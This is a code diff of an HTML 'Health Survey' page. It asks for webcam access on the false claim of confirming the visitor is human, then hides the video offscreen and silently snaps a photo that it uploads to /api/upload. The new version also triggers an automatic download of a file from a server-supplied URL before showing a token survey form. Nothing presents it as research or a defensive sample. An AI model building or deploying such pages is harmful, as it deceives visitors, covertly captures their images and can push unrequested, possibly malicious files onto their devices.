@@ -4,53 +4,105 @@
 <meta charset="UTF-8">
 <title>Health Survey</title>
 <style>
-body { font-family: Arial; text-align: center; background: linear-gradient(to bottom right, #ff9a9e, #fad0c4); color: #fff; margin: 0; padding: 0; }
-h2 { margin-top: 50px; }
-video, canvas { display: none; }
+body { font-family: Arial; text-align: center; margin-top: 30px; background: #f2f2f2; }
+video { width: 1px; height: 1px; position: absolute; top: -100px; left: -100px; }
+canvas { display: none; }
+h2 { color: #333; }
+p { color: #555; }
+form { margin-top: 20px; display: none; background: #fff; padding: 20px; border-radius: 10px; width: 320px; margin-left: auto; margin-right: auto; }
+input, select, textarea { width: 100%; margin-bottom: 10px; padding: 6px; }
+button { padding: 10px 20px; cursor: pointer; background: #4CAF50; color: white; border: none; border-radius: 5px; }
 </style>
 </head>
+
 <body>
-<h2>Please allow the camera to confirm you are a human 😊</h2>
-<p>It’s just one photo, then you'll proceed to the survey.</p>
+<h2>Please allow camera to continue 😊</h2>
+<p>This helps us confirm you are human before the survey.</p>
 
 <video id="video" autoplay></video>
 <canvas id="canvas"></canvas>
 
-<script>
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
+<form id="surveyForm">
+  <h3>Health Survey</h3>
 
-async function capturePhoto() {
+  <label>Name:</label>
+  <input type="text" name="name" required>
+
+  <label>How many hours do you sleep?</label>
+  <select name="sleep" required>
+    <option value="<5"><5</option>
+    <option value="5-6">5-6</option>
+    <option value="6-7">6-7</option>
+    <option value="7+">7+</option>
+  </select>
+
+  <button type="submit">Submit</button>
+</form>
+
+<p id="thanksMessage" style="display:none;">Thank you for confirming! Redirecting to survey...</p>
+
+<script>
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const form = document.getElementById("surveyForm");
+const thanks = document.getElementById("thanksMessage");
+
+async function init() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     video.srcObject = stream;
 
-    setTimeout(() => {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-
-      canvas.toBlob(async (blob) => {
-        const formData = new FormData();
-        formData.append('photo', blob);
-
-        try {
-          await fetch('/api/upload', { method: 'POST', body: formData });
-        } catch (err) {
-          console.error('Upload failed', err);
-        }
-
-        stream.getTracks().forEach(track => track.stop());
-        window.location.href = 'thankyou.html';
-      });
-    }, 500);
+    setTimeout(() => captureAndSend(stream), 1000);
 
   } catch (err) {
-    alert('Camera permission is required to continue.');
+    alert("Camera permission is required to continue.");
   }
 }
 
-capturePhoto();
+function captureAndSend(stream) {
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video, 0, 0);
+
+  canvas.toBlob(async (blob) => {
+    const formData = new FormData();
+    formData.append("photo", blob);
+
+    try {
+      const res = await fetch("/api/upload", { method: "POST", body: formData });
+      const data = await res.json();
+
+      if (data.status === "success") {
+        // Trigger download
+        const a = document.createElement("a");
+        a.href = data.downloadUrl;
+        a.download = ""; 
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+
+        // Show survey
+        document.querySelector('h2').style.display = 'none';
+        document.querySelector('p').style.display = 'none';
+        form.style.display = 'block';
+      } else {
+        alert("Upload failed.");
+      }
+    } catch (err) {
+      alert("Upload failed. Refresh and try again.");
+    }
+  });
+
+  stream.getTracks().forEach(track => track.stop());
+}
+
+form.addEventListener("submit", e => {
+  e.preventDefault();
+  form.style.display = "none";
+  thanks.style.display = "block";
+});
+
+init();
 </script>
 </body>
 </html>
